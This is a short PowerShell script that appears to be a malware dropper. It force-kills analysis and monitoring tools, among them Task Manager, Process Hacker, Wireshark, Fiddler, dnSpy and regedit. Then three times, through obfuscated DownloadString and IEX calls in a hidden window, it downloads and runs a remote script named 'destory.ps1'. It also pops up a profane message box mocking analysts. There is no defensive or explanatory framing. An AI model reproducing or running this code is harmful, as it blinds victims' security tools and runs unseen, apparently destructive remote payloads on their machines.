$2kill = @('cmd', 'taskmgr', 'process', 'processhacker', 'ksdumper', 'fiddler', 'httpdebuggerui', 'wireshark', 'httpanalyzerv7', 'fiddler', 'decoder', 'regedit', 'procexp', 'dnspy', 'vboxservice', 'burpsuit', 'DbgX.Shell', 'ILSpy')

foreach ($prg in $2kill) {
    $rprc = Get-Process -Name $prg -ErrorAction SilentlyContinue
    if ($rprc) {
        Stop-Process -Name $prg -Force 
        Write-Host "[+] Closed process: $prg" -ForegroundColor Yellow
    }
}
$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null
[System.Windows.Forms.MessageBox]::Show("Analysis is gay!", " Fuck ", "OK", "Warning")
$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
